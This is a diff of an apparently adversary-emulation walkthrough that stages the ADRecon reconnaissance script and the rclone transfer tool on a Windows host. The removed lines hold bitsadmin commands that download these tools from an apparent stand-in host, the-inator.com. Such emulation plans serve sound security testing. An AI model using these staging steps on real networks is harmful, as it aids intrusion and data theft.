@@ -53,11 +53,6 @@ Edge and browse to:
     https://github.com/sense-of-security/ADRecon/blob/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1
     ```
     * Click the download button to "Download raw file" to the Downloads folder
-    * :heavy_exclamation_mark: If OVR testing, you will not have internet access to browse to GitHub. Instead:
-        * Open a non-elevated PowerShell and execute:
-            ```
-            bitsadmin /transfer ovr /download http://the-inator.com/digirevenge/ADRecon.ps1 C:\Users\zorimoto\Downloads\ADRecon.ps1
-            ```
 
 * Open a non-elevated PowerShell and execute ADRecon.ps1:
   ```
@@ -288,11 +283,6 @@ Edge and browse to the following link to initiate the download of rclone:
     ```
     https://github.com/rclone/rclone/releases/download/v1.64.0/rclone-v1.64.0-windows-amd64.zip
     ```
-    * :heavy_exclamation_mark: If OVR testing, you will not have internet access to browse to GitHub. Instead:
-    * Open a non-elevated PowerShell and execute:
-        ```
-        bitsadmin /transfer ovr2 /download http://the-inator.com/digirevenge/rclone-v1.64.0-windows-amd64.zip C:\Users\zorimoto\Downloads\rclone-v1.64.0-windows-amd64.zip
-        ```
 
 * Go to the Downloads folder, right-click the rclone zip, click
 "Extract all..." from the menu, and in the window that opens, click the Extract
